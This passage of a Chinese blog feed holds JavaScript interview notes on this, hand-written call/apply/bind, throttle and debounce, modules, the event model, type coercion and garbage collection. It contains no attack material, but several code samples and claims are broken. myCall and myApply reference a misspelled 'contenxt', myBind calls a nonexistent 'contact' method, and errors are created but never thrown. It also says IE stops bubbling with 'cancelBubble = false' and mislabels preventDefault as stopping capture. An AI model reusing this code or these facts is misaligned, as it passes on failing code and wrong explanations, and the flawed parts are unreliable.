title="异步模式"></a>异步模式</h3><p>异步模式又称非阻止模式，浏览器在下载执行js同时，还会继续进行后续页面的处理</p><ol><li>动态添加script标签</li><li>defer</li><li>async(h5)</li></ol><p>defer属性和async属性都属于script上面的，两者都能实现js的异步加载。不同的是async在异步加载完成的时候就马上开始执行，defer会等到html加载完成后，在window.onload之前执行，他们仅适用于外部脚本（只有在使用 src 属性时）</p><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>在JS中，对this的研究一般都是this的指向问题，核心就是this永远指向最终调用它的那个对象，除非改变this指向或者箭头函数的特殊情况</p><h2 id="call，apply，bind"><a href="#call，apply，bind" class="headerlink" title="call，apply，bind"></a>call，apply，bind</h2><h3 id="相同点"><a href="#相同点" class="headerlink" title="相同点"></a>相同点</h3><p>都可以改变this的指向</p><h3 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h3><ol><li>apply方法传入两个参数，一个是作为函数上下文的对象，一个是函数参数组成的数组</li><li>call方法第一个参数也是作为函数上下文的对象，但是后面传入的是一个参数列表</li><li>bind同call</li></ol><p>apply和call方法都会使函数立即执行，因此他们也可以用来调用函数</p><p>bind方法不会立即执行，而是返回了一个改变了上下文this的函数，同时bind返回的函数可以作为构造函数来使用</p><h3 id="手写call"><a href="#手写call" class="headerlink" title="手写call"></a>手写call</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myCall = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Error</span>( <span class="string">"不是函数"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> args = [...arguments].slice(<span class="number">1</span>)</span><br><span class="line">    context = context || <span class="built_in">window</span></span><br><span class="line">    context.fn = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">let</span> result</span><br><span class="line">    <span class="keyword">if</span>(args) &#123;</span><br><span class="line">        result= contenxt.fn(...args)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result= context.fn()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> context.fn</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="手写apply"><a href="#手写apply" class="headerlink" title="手写apply"></a>手写apply</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myApply = <span class="function"><span class="keyword">function</span>(<span class="params">context,array</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Error</span>( <span class="string">"不是函数"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    context = context || <span class="built_in">window</span></span><br><span class="line">    context.fn = <span class="keyword">this</span></span><br><span class="line">    <span class="keyword">let</span> result</span><br><span class="line">    <span class="keyword">if</span>(array) &#123;</span><br><span class="line">        result= contenxt.fn(...array)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result= context.fn()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">delete</span> context.fn</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="手写bind"><a href="#手写bind" class="headerlink" title="手写bind"></a>手写bind</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.myBind = <span class="function"><span class="keyword">function</span>(<span class="params">context</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Error</span>( <span class="string">"不是函数"</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> arg1 = [...arguments].slice(<span class="number">1</span>),_this = <span class="keyword">this</span></span><br><span class="line">    bindFn = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> arg2 = [...arguments]</span><br><span class="line">        <span class="keyword">return</span> _this.apply(<span class="keyword">this</span> <span class="keyword">instanceof</span> bindFn ? <span class="keyword">this</span>: context, arg1.contact(arg2))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> prototype = <span class="built_in">Object</span>.create(_this.prototype)</span><br><span class="line">    bindFn.prototype = prototype</span><br><span class="line">    bindFn.prototype.constructor = bindFn</span><br><span class="line">    <span class="keyword">return</span> bindFn</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="内存泄漏和内存溢出"><a href="#内存泄漏和内存溢出" class="headerlink" title="内存泄漏和内存溢出"></a>内存泄漏和内存溢出</h2><p>内存泄漏是指一块被分配的内存既不能使用，又不能回收，直到浏览器进程结束</p><h3 id="可能导致内存泄漏的操作"><a href="#可能导致内存泄漏的操作" class="headerlink" title="可能导致内存泄漏的操作"></a>可能导致内存泄漏的操作</h3><ol><li>意外的全局变量</li><li>闭包</li><li>循环引用</li><li>被遗忘的定时器或者回调函数</li></ol><p>内存泄漏多了之后会导致内存溢出，使页面无法加载显示</p><h2 id="事件代理"><a href="#事件代理" class="headerlink" title="事件代理"></a>事件代理</h2><p>事件代理通俗来说就是将元素的事件委托给父级或更外级的元素来处理</p><p>原理：利用事件的冒泡机制来处理</p><p>优点：只需要将同类元素的事件委托给父级或更外级的元素，不需要给所有元素都绑定事件，减少内存空间占用，提升性能，动态新增的元素也无需重新绑定事件</p><h2 id="CommonJS和ES6模块化"><a href="#CommonJS和ES6模块化" class="headerlink" title="CommonJS和ES6模块化"></a>CommonJS和ES6模块化</h2><h3 id="本质上区别"><a href="#本质上区别" class="headerlink" title="本质上区别"></a>本质上区别</h3><ol><li>无论CommonJS还是ES6模块输出都可以看成是一个具备多个属性或者方法的对象</li><li>default是ES6模块所独有的关键字，export default fs输出默认的接口对象，import fs from ‘fs’可直接导入这个对象</li><li>ES6模块中导入模块的属性或者方法是强绑定的包括基础类型，而CommonJS则是普通的值传递或者引用传递</li><li>ES6模块的设计思想是尽量的静态化，使得编译时就能确定模块的依赖关系以及输入输出的变量(静态优化)，CommonJS都只能在运行时确定这些东西(运行时加载)</li><li>ES6模块不是对象，而是通过export命令显式指定输出的代码，输入时也采用静态命令的形式，CommonJS模块是一个对象</li><li>CommonJS模块重要的特征是加载时执行，即脚本代码在require的时候就会全部执行。一旦出现某个模块被循环加载，就只输出已经执行的部分，还未执行的部分不会输出</li><li>ES6模块是动态引用，如果使用import从一个模块加载变量，那些变量不会被缓存，而是成为一个指向被加载模块的引用，需要开发者保证真正取值的时候能取得这些值</li></ol><h3 id="export和default-export的区别"><a href="#export和default-export的区别" class="headerlink" title="export和default export的区别"></a>export和default export的区别</h3><ol><li>两者均可用于导出常量，函数，文件，模块等</li><li>在一个文件或模块中，export、import可以有多个，而export default仅有一个</li><li>通过export方式导出，在导入的时候要加{}，export default不需要</li><li>使用export default命令，为模块指定默认输出，这样就不需要知道所要加载模块的变量名，export需要知道</li><li>export default命令的本质就是将后面的值，赋给default变量，所以可以直接将一个值写在最后</li></ol><h2 id="节流和去抖"><a href="#节流和去抖" class="headerlink" title="节流和去抖"></a>节流和去抖</h2><p>节流和去抖的区别：节流和去抖都是中间过程的函数被限制触发，但是节流是减少触发频率，去抖是把中间过程函数都过滤掉，只执行规定时间最后一个事件</p><h3 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h3><p>节流是使得一定时间内只触发一次函数。原理是判断是否达到一定时间来触发函数，若还没到规定时间则用计时器延后，而下一次事件会重新设计定时器<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throttle</span>(<span class="params">func, wait</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> time = <span class="literal">null</span>,startTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> args = <span class="built_in">arguments</span></span><br><span class="line">            <span class="keyword">let</span> currentTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">            <span class="keyword">const</span> remaining = currentTime-startTime-wait</span><br><span class="line">            <span class="keyword">if</span>(time) clearTimeout(time)</span><br><span class="line">            <span class="keyword">if</span>(remaining&gt;=<span class="number">0</span>) &#123;</span><br><span class="line">                func.apply(<span class="keyword">this</span>, args)</span><br><span class="line">                startTime = <span class="keyword">new</span> <span class="built_in">Date</span>()</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                time = setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                    func.apply(<span class="keyword">this</span>, args)</span><br><span class="line">                &#125;,remaining)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//例如监听滚轮事件，一直快速滚动会再第一次执行方法后会建立定时器又销毁定时器的过程，直到间隔时间大于延迟时间，才触发第二次，在停止滚动后，最后一个定时器没被销毁，会执行最后一次方法</span></span><br></pre></td></tr></table></figure></p><h3 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h3><p>将几次操作合并成一次操作执行。原理是维护一个定时器，触发事件后经过delay秒执行方法，如果在delay之间再次触发事件，会重新设置定时器，这样一来只有最后一次操作会执行方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">func, wait, immediate</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> time = <span class="literal">null</span> </span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">const</span> args = <span class="built_in">arguments</span></span><br><span class="line">            <span class="keyword">if</span>(!immediate) &#123;</span><br><span class="line">                <span class="keyword">if</span>(time) clearTimeout(time)</span><br><span class="line">                time = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                    func.apply(<span class="keyword">this</span>, args)</span><br><span class="line">                &#125;, wait)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(!time) &#123;</span><br><span class="line">                    func.apply(<span class="keyword">this</span>, args)             </span><br><span class="line">                &#125;   </span><br><span class="line">                time = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                    clearTimeout(time)</span><br><span class="line">                &#125;,wait) </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//这个防抖效果是，当你触发事件后，至少要等delay秒才会执行方法，如果在delay秒之间再次触发事件，原来定时器会被销毁，重新开始一个定时器</span></span><br></pre></td></tr></table></figure><h2 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h2><p>w3c定义事件发生经历三个阶段，捕获阶段，目标阶段，冒泡阶段</p><ol><li>冒泡事件：子级元素先触发，父级元素后触发</li><li>捕获事件：父级元素先触发，子级元素后触发</li><li>阻止冒泡：在w3c下使用stopPropagation()，在IE下使用cancelBubble = false</li><li>阻止捕获：相当于阻止默认行为，w3c中使用preventDefault(),在IE下使用returnValue = false</li><li>如果给一个节点同时注册捕获和冒泡事件，那么触发的顺序是注册的顺序</li></ol><h2 id="各种height和width和left和top的区别"><a href="#各种height和width和left和top的区别" class="headerlink" title="各种height和width和left和top的区别"></a>各种height和width和left和top的区别</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">    width: 200px;</span><br><span class="line">    height: 200px;</span><br><span class="line">    padding: 20px;</span><br><span class="line">    border: 5px solid lightgreen;</span><br><span class="line">    margin:50px auto;</span><br><span class="line">    background-color: lightskyblue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="一-clientWidth和clientHeigh-、-clientTop和clientLeft"><a href="#一-clientWidth和clientHeigh-、-clientTop和clientLeft" class="headerlink" title="一.clientWidth和clientHeigh 、 clientTop和clientLeft"></a>一.clientWidth和clientHeigh 、 clientTop和clientLeft</h3><ol><li>clientWidth = width + 左右padding $(‘.box’)[0].clientWidth 240px</li><li>clientHeight = height + 上下padding $(‘.box’)[0].clientHeight 240px</li><li>clientTop = border-top $(‘.box’)[0].clientTop 5px</li><li>clientLeft = border-left $(‘.box’)[0].clientLeft 5px</li></ol><h3 id="二、offsetWidth和offsetHight-、-offsetTop和offsetLeft"><a href="#二、offsetWidth和offsetHight-、-offsetTop和offsetLeft" class="headerlink" title="二、offsetWidth和offsetHight 、 offsetTop和offsetLeft"></a>二、offsetWidth和offsetHight 、 offsetTop和offsetLeft</h3><ol><li>offsetWidth = width + 左右padding +左右border $(‘.box’)[0].offsetWidth 250px</li><li>offsetHeight = height + 上下padding + 上下border $(‘.box’)[0].offsetHeight 250px</li><li>offsetTop = 当前元素 上边框 外边缘 到 最近的已定位父级（offsetParent） 上边框 内边缘的 距离。如果父级都没有定位，则分别是到body 顶部 距离 $(‘.box’)[0].clientTop 50px</li><li>offsetLeft = 当前元素 左边框 外边缘 到 最近的已定位父级（offsetParent） 左边框 内边缘的            距离。如果父级都没有定位，则分别是到body 顶部 和左边的距离 $(‘.box’)[0].clientLeft 254px</li></ol><h3 id="三、scrollWidth和scrollHeight-scrollTop和scrollLeft"><a href="#三、scrollWidth和scrollHeight-scrollTop和scrollLeft" class="headerlink" title="三、scrollWidth和scrollHeight,scrollTop和scrollLeft"></a>三、scrollWidth和scrollHeight,scrollTop和scrollLeft</h3><ol><li>scrollWidth = 获取指定标签内容层的真实宽度（可视区域宽度+被隐藏区域宽度）</li><li>scrollHeight =   scrollHeight：获取指定标签内容层的真实高度（可视区域高度+被隐藏区域高度）</li><li>scrollTop = 内容层顶部 到 可视区域顶部的距离。</li><li>scrollLeft = 内容层左端 到 可视区域左端的距离.<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).scroll(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log($(<span class="built_in">window</span>).scrollTop());</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="JS的几种类型的值"><a href="#JS的几种类型的值" class="headerlink" title="JS的几种类型的值"></a>JS的几种类型的值</h2><ul><li>栈：存放原始数据类型(Null,Undefined,Number,String,Boolean,Symbol)</li><li>堆：存放引用数据类型(Array,Object,Function)</li><li>原始数据类型直接存储在栈中，占据空间小，大小固定</li><li>引用数据类型在栈中存储了指针，在堆中存储了对象，指针是一个地址，指向堆中实体的起始地址。当解释器寻找引用类型的值时，会首先检索其在栈中的地址，取得地址后从堆中取得实体</li></ul><p><img src="https://camo.githubusercontent.com/d1947e624a0444d1032a85800013df487adc5550/687474703a2f2f7777772e77337363686f6f6c2e636f6d2e636e2f692f63745f6a735f76616c75652e676966" alt></p><h2 id="js中变量提升和函数提升的顺序"><a href="#js中变量提升和函数提升的顺序" class="headerlink" title="js中变量提升和函数提升的顺序"></a>js中变量提升和函数提升的顺序</h2><p>首先进行函数提升，随后进行变量声明的提升<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(fun)</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fun = <span class="number">000</span></span><br></pre></td></tr></table></figure></p><p>在上面这个情况，函数会优先提升，随后变量声明提升，但不会覆盖函数，等去到变量赋值阶段才会覆盖</p><h2 id="手写instanceof"><a href="#手写instanceof" class="headerlink" title="手写instanceof"></a>手写instanceof</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">instance_of</span>(<span class="params">left,right</span>) </span>&#123;</span><br><span class="line">   left = left.__proto__;</span><br><span class="line">   <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(left === <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(left == right.prototype) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    left = left.__proto__</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><p><img src="https://user-gold-cdn.xitu.io/2018/11/15/16716dec14421e47?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p><h3 id="的转换顺序"><a href="#的转换顺序" class="headerlink" title="==的转换顺序"></a>==的转换顺序</h3><p><img src="https://user-gold-cdn.xitu.io/2018/12/19/167c4a2627fe55f1?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt></p><ul><li>首先判断类型是否相同，相同的话直接比较大小</li><li>类型不同会先进行类型转换，先判断是不是null和undefined，是就返回true</li><li>判断两者是否为string和number，是就将字符串转换为number</li><li>判断一方是否为boolean，是就转换为number在进行判断</li><li>判断其中一方是否为object且另一方为string，number，或者symbol，是的话就会把object转为原始类型在进行判断(先使用valueof，没有就用toString)<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[] == ![]  <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ![] =&gt; false</span></span><br><span class="line"><span class="comment">// false =&gt; 0</span></span><br><span class="line"><span class="comment">// [] =&gt; "" [].valueOf().toString() =&gt; ''</span></span><br><span class="line"><span class="comment">// "" =&gt; 0</span></span><br><span class="line"><span class="comment">//因此0 == 0 返回true</span></span><br><span class="line"></span><br><span class="line">&#123;&#125; == !&#123;&#125; <span class="literal">false</span></span><br><span class="line"><span class="comment">// !&#123;&#125; =&gt; false</span></span><br><span class="line"><span class="comment">// false =&gt; 0</span></span><br><span class="line"><span class="comment">// &#123;&#125; =&gt; '[object Object]' &#123;&#125;.valueOf().toString() =&gt; '[object Object]'</span></span><br><span class="line"><span class="comment">//因此 '[object Object]' == 0 返回false</span></span><br><span class="line"></span><br><span class="line">复杂数据类型会先转换成<span class="built_in">String</span>再转换成<span class="built_in">Number</span>运算</span><br><span class="line">[] == [] <span class="literal">false</span></span><br><span class="line">&#123;&#125; == &#123;&#125; <span class="literal">false</span></span><br><span class="line">[] == <span class="number">0</span> <span class="literal">true</span></span><br><span class="line">![] == <span class="number">0</span> <span class="literal">true</span></span><br><span class="line">&#123;&#125; == <span class="number">0</span> <span class="literal">false</span></span><br><span class="line">!&#123;&#125; == <span class="number">0</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">    i:<span class="number">0</span></span><br><span class="line">    valueOf:<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++a.i</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">1</span> &amp;&amp; a==<span class="number">2</span> &amp;&amp; a==<span class="number">3</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="literal">true</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="JS垃圾回收"><a href="#JS垃圾回收" class="headerlink" title="JS垃圾回收"></a>JS垃圾回收</h2><h3 id="什么是垃圾？"><a href="#什么是垃圾？" class="headerlink" title="什么是垃圾？"></a>什么是垃圾？</h3><p>一般俩说没有被引用的对象就是垃圾，如果几个对象引用形成一个环互相引用，但根访问不到他们，这几个对象也是垃圾。</p><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>JS的垃圾回收机制是为了防止内存泄漏，内存泄漏是指当已经不需要某块内存时这内存还存在着，垃圾回收机制就是间歇的不定期的寻找到不再使用的变量，并释放他们所指向的内存</p><h3 id="变量的生命周期"><a href="#变量的生命周期" class="headerlink" title="变量的生命周期"></a>变量的生命周期</h3><p>当一个变量的生命周期结束之后它所指向的内存就应该被释放。JS有两种变量，全局变量和局部变量。局部变量的生命周期在函数执行过后就结束了，此时便可将他引用的内存释放(垃圾回收)，但全局变量的生命周期会持续到浏览器关闭。</p><h3 id="JS垃圾回收方式"><a href="#JS垃圾回收方式" class="headerlink" title="JS垃圾回收方式"></a>JS垃圾回收方式</h3><h4 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h4><p>大部分浏览器用这种方式进行垃圾回收，当变量进入执行环境的时候，垃圾回收期将其标记为进入环境，离开环境的时候标记离开环境。他会标记所有可访问对象。第二阶段扫描收集所有未标记的对象(未被引用对象)，他们不会被立即回收，而是将一直累积到内存耗尽为止。当内存耗尽的时候程序被挂起，垃圾回收开始执行，当所有未引用对象被清理完毕程序才会继续执行</p><p>优化：垃圾回收分解成多部分，各部分分别进行，需要额外的标记跟踪变化，这样有很多微小的延迟而不是很大的延迟。存在足够久的对象会变“老”，接受检查次数变少。垃圾回收器只在CPU空闲运行，减少对执行的影响。</p><h4 id="引用计数-了解"><a href="#引用计数-了解" class="headerlink" title="引用计数(了解)"></a>引用计数(了解)</h4><p>常常会引起内存泄漏，低版本的IE会使用。跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则该值的引用次数就是1。如果同一个值又被赋给另一个变量则该值的引用次数加1。如果包含对该值引用的变量又取得另一个值，则该值的引用次数减1。当该值得引用次数变为0时，则可以回收其占用的内存空间。垃圾回收器下一次运行时会释放那些引用次数为0的值所占用的内存。</p><p>缺点：循环引用<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">obj</span>(<span class="params"></span>) </span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> objA = <span class="keyword">new</span> <span class="built_in">Object</span>();  </span><br><span class="line">    <span class="keyword">var</span> objB = <span class="keyword">new</span> <span class="built_in">Object</span>();  </span><br><span class="line">    objA.propertyA = objB;  </span><br><span class="line">    objB.propertyA = objA;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时objA和objB这两个值引用次数为2，函数结束销毁objA和objB变量，可是值引用次数只是减1，所以两个对象仍然继续存在无法被回收。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章会记录我的一些js知识点笔记，方便自己进行复习，长期施工…&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="面试题" scheme="https://gzzzzh.github.io/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    
      <category term="javascript" scheme="https://gzzzzh.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>彻底弄懂js事件执行机制</title>
    <link href="https://gzzzzh.github.io/2019/06/22/%E5%BD%BB%E5%BA%95%E5%BC%84%E6%87%82js%E4%BA%8B%E4%BB%B6%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6/"/>
    <id>https://gzzzzh.github.io/2019/06/22/彻底弄懂js事件执行机制/</id>
    <published>2019-06-22T03:58:07.000Z</published>
    <updated>2019-06-22T03:59:01.468Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JS执行机制"><a href="#JS执行机制" class="headerlink" title="JS执行机制"></a>JS执行机制</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Javascript是一门单线程的语言，多线程都是用单线程模拟出来的。而Event Loop是javascript的执行机制，是js实现异步的一种方法。</p><a id="more"></a><h3 id="js事件循环"><a href="#js事件循环" class="headerlink" title="js事件循环"></a>js事件循环</h3><p>当我们打开网页时，网页渲染过程就是一大堆同步任务，比如页面骨架和页面元素的渲染，而定时器，事件函数，ajax请求是异步任务</p><ol><li>同步和异步任务分别进入不同的执行场所，同步的进入主线程，异步的进入Event Table并注册函数。</li><li>当指定事件完成时，Event Table会将这个函数放进事件队列</li><li>主线程内的任务执行完毕为空，会到事件队列读取对应函数</li><li>不断重复上述过程，也就是我们所说的Event Loop事件循环</li></ol><p>js引擎存在一个进程会持续检查主线程执行栈是否为空，一旦为空就会去事件队列那里检查是否有等待被调用的函数，如果有，在放进主线程执行</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>我们知道这个函数，是经过指定时间后，把要执行的任务加入到事件队列中，又因为单线程是一个一个执行，如果主线程任务运行太久，所以只能干等，导致真正的延迟时间大于我们一开始的指定时间。</p><p>我们还会经常遇到setTimeout(fn,0)他的含义是指定fn这个任务在主线程最早可得的空闲时间执行，意思是主线程执行栈内容的同步任务执行完后会立即执行fn</p><h3 id="setInterval"><a href="#setInterval" class="headerlink" 